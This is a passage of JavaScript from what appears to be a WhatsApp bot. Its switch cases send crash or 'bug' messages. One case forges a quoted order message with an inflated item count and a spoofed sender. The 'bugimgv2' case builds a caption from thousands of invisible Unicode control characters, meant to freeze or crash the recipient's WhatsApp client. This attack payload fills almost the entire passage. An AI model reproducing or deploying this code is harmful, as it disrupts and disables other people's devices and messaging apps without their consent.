zoe.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`hm/virgam.jpeg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`hm/virgam.jpeg`),"itemCount":999999999,"status":"INQUIRY","surface":"CATALOG","message":` BODY `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
break
case 'bugimgv2':
await zoe.toggleDisappearingMessages(from)
wew = fs.readFileSync(`./hm/vvirgamv2.jpeg`)
lzain = `
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎